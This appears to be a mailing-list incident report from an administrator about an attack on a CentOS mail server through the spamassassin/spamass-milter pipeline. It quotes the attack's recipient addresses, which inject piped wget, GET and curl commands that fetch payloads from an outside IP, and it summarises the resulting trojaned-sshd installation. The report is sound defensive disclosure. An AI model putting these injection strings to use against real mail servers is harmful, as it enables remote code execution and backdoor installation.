<PRE>This is a heads-up that there might be an actively exploited 
vulnerability in either the spamassassin or spamass-milter package. 
I'm still unsure where the problem lies, but here's what I know.

The system described below runs x86_64 release of CentOS 5.4. SELinux 
was, at the time, in Permissive mode. The packages involved, as far as 
I can tell, are

  * spamassassin-3.2.5-1.el5.rf
  * spamass-milter-0.3.1-1.el5.rf
  * sendmail-8.13.8-2.el5 (not rpmforge, obviously)

Mar 15 05:47 (times are PDT): Several messages arrived with suspicious 
recipients:

  &lt;root+:&gt;
  &lt;root+:&quot;|wget <A HREF="http://61.100.185.177/busy-1.php">http://61.100.185.177/busy-1.php</A>&quot;&gt;
  &lt;root+:&quot;|GET <A HREF="http://61.100.185.177/busy-2.php">http://61.100.185.177/busy-2.php</A>&quot;&gt;
  &lt;root+:&quot;|curl <A HREF="http://61.100.185.177/busy-3.php">http://61.100.185.177/busy-3.php</A>&quot;&gt;

Sendmail recognized the addresses as syntactically evil, but a process 
running under the spamass_milter_t context ran wget, GET, and curl and 
connected to the IP address in the addresses above.

The file(s) downloaded by these processes executed a shell script. It 
did several things, the highlights of which are

  1. It downloaded, uncompressed, and untar-ed a file named
     xS.tar.gz. The resulting directory name was /xS.

  2. It tried to add a unix group and user named &quot;sshd&quot;; the attempt
     failed, probably because there's already an sshd user and group
     on the system.

  3. It installed 32-bit Linux executables in place of /usr/bin/ssh
     and /usr/sbin/sshd. The new executables were dynamically linked
     against a small number of libraries, but most of the supporting
     libraries had been compiled directly into the applications.

  4. It installed a minimal /etc/ssh/sshd_config and an empty
     /etc/ssh/ssh_config.

  5. After verifying that sshd was in the process table, it
     removed the /xS directory.

  6. It created an empty file name /dev/devno

  7. It restarted sshd using /sbin/service

Again, this was all done under the spamass_milter_t security context.

I don't know enough about the sendmail &lt;-&gt; spamass-milter &lt;-&gt; spamd 
pipeline to have a definitive idea about what application misparsed 
the piped e-mail addresses and executed them.

I saw the attack again this morning, but by then I'd cleaned things up 
and gotten SELinux back into Enforcing mode, which prevented the 
exploit from working again.
